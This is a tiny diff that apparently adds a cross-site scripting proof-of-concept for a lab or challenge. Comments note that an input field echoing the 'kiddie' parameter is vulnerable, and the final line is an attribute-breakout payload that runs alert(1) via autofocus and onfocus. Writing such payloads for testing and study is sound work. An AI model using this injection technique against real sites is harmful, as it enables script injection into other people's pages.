@@ -1,0 +1,4 @@
+// kiddie is rendered in both <h1> and <input> in response page
+// The <input> is vulerable to XSS
+
+kiddie" autofocus onfocus=alert(1) x="
